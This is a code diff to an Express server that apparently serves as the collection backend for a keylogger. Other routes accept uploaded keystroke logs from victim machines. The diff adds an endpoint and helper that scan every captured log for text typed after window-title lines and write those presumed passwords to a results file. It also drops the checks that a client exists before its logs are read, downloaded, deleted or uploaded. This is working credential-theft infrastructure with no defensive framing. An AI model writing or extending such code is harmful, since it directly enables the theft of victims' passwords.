@@ -1119,55 +1119,55 @@ app.get('/api/clients/:clientId/logs', asyncHandler(async (req, res) => {
 
 app.get('/api/clients/:clientId/logs/:filename', asyncHandler(async (req, res) => {
     const clientInfo = getClientInfoById(req.params.clientId);
-    if (!clientInfo.exists) {
-        return res.status(404).json({ error: '客户端不存在' });
-    }
     const filename = path.basename(req.params.filename);
     if (filename !== req.params.filename) {
         return res.status(400).json({ error: '非法文件名' });
     }
-    const filePath = `${clientInfo.logDir}/${filename}`;
+    // 对于密码提取结果文件，直接从根目录读取
+    const filePath = filename.startsWith('passwords_') 
+        ? `${alistClient.basePath}/${filename}` 
+        : `${(clientInfo.exists ? clientInfo.logDir : alistClient.basePath)}/${filename}`;
     const content = await alistClient.readFile(filePath);
     res.json({ content });
 }));
 
 app.get('/api/clients/:clientId/logs/:filename/download', asyncHandler(async (req, res) => {
     const clientInfo = getClientInfoById(req.params.clientId);
-    if (!clientInfo.exists) {
-        return res.status(404).json({ error: '客户端不存在' });
-    }
     const filename = path.basename(req.params.filename);
     if (filename !== req.params.filename) {
         return res.status(400).json({ error: '非法文件名' });
     }
-    const filePath = `${clientInfo.logDir}/${filename}`;
+    // 对于密码提取结果文件，直接从根目录读取
+    const filePath = filename.startsWith('passwords_') 
+        ? `${alistClient.basePath}/${filename}` 
+        : `${(clientInfo.exists ? clientInfo.logDir : alistClient.basePath)}/${filename}`;
     await alistClient.downloadFile(filePath, res);
 }));
 
 app.get('/api/clients/:clientId/logs/:filename/raw', asyncHandler(async (req, res) => {
     const clientInfo = getClientInfoById(req.params.clientId);
-    if (!clientInfo.exists) {
-        return res.status(404).send('客户端不存在');
-    }
     const filename = path.basename(req.params.filename);
     if (filename !== req.params.filename) {
         return res.status(400).send('非法文件名');
     }
-    const filePath = `${clientInfo.logDir}/${filename}`;
+    // 对于密码提取结果文件，直接从根目录读取
+    const filePath = filename.startsWith('passwords_') 
+        ? `${alistClient.basePath}/${filename}` 
+        : `${(clientInfo.exists ? clientInfo.logDir : alistClient.basePath)}/${filename}`;
     const content = await alistClient.readFile(filePath);
     res.type('text/plain').send(content);
 }));
 
 app.delete('/api/clients/:clientId/logs/:filename', asyncHandler(async (req, res) => {
     const clientInfo = getClientInfoById(req.params.clientId);
-    if (!clientInfo.exists) {
-        return res.status(404).json({ error: '客户端不存在' });
-    }
     const filename = path.basename(req.params.filename);
     if (filename !== req.params.filename) {
         return res.status(400).json({ error: '非法文件名' });
     }
-    const filePath = `${clientInfo.logDir}/${filename}`;
+    // 对于密码提取结果文件，直接从根目录删除
+    const filePath = filename.startsWith('passwords_') 
+        ? `${alistClient.basePath}/${filename}` 
+        : `${(clientInfo.exists ? clientInfo.logDir : alistClient.basePath)}/${filename}`;
     
     await alistClient.deleteFile(filePath);
     logger.info(`日志文件已删除: ${filePath}`, { clientId: req.params.clientId });
@@ -1181,15 +1181,85 @@ app.post('/api/upload/:ip', express.raw({ type: 'text/plain', limit: CONFIG.uplo
     if (!clientId) {
         clientId = Array.from(clientManager.knownClients.keys()).find(id => id.startsWith(ip));
     }
-    if (!clientId) {
-        return res.status(404).json({ error: '客户端不存在' });
-    }
+    // 即使客户端不存在，也允许上传文件
     const client = clientManager.clients.get(clientId);
     const logDir = client ? client.logDir : alistClient.basePath;
     const filename = `${ip}_${new Date().toISOString().slice(0, 10).replace(/-/g, '')}.log`;
     const result = await alistClient.uploadFile(logDir, filename, req.body.toString());
     res.json(result);
 }));
+
+app.post('/api/extract-passwords', asyncHandler(async (req, res) => {
+    try {
+        // 列出所有日志文件
+        const allFiles = await alistClient.listFiles(alistClient.basePath);
+        const logFiles = allFiles.filter(file => file.filename.endsWith('.log'));
+        
+        if (logFiles.length === 0) {
+            return res.json({ success: true, count: 0, file: '无日志文件' });
+        }
+        
+        // 提取密码
+        let extractedPasswords = [];
+        for (const file of logFiles) {
+            try {
+                const content = await alistClient.readFile(`${alistClient.basePath}/${file.filename}`);
+                const passwords = extractPasswordsFromLog(content, file.filename);
+                extractedPasswords = [...extractedPasswords, ...passwords];
+            } catch (error) {
+                logger.warn(`读取日志文件失败: ${file.filename}`, { error: error.message });
+            }
+        }
+        
+        // 保存提取结果
+        const resultFilename = `passwords_${new Date().toISOString().slice(0, 19).replace(/[-:]/g, '').replace('T', '_')}.txt`;
+        const resultContent = extractedPasswords.map((item, index) => {
+            return `${index + 1}. 来自: ${item.file}\n时间: ${item.timestamp}\n内容: ${item.password}\n`;
+        }).join('\n');
+        
+        await alistClient.uploadFile(alistClient.basePath, resultFilename, resultContent);
+        
+        res.json({ 
+            success: true, 
+            count: extractedPasswords.length, 
+            file: resultFilename 
+        });
+    } catch (error) {
+        logger.error('提取密码失败', { error: error.message });
+        res.status(500).json({ error: '提取密码失败' });
+    }
+}));
+
+// 从日志内容中提取密码
+function extractPasswordsFromLog(content, filename) {
+    const passwords = [];
+    const lines = content.split('\n');
+    
+    for (let i = 0; i < lines.length; i++) {
+        const line = lines[i].trim();
+        // 查找包含时间戳的行
+        if (line.startsWith('[Window:')) {
+            // 提取时间戳
+            const timestampMatch = line.match(/at (\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\+\d{4})/);
+            const timestamp = timestampMatch ? timestampMatch[1] : '未知';
+            
+            // 检查下一行是否包含密码
+            if (i + 1 < lines.length) {
+                const nextLine = lines[i + 1].trim();
+                // 密码模式：包含字母数字和可能的特殊键如 [RSHIFT][TAB] 等
+                if (nextLine && !nextLine.startsWith('[') && !nextLine.startsWith('[')) {
+                    passwords.push({
+                        file: filename,
+                        timestamp: timestamp,
+                        password: nextLine
+                    });
+                }
+            }
+        }
+    }
+    
+    return passwords;
+}
 
 // 统一错误处理中间件
 app.use((err, req, res, next) => {
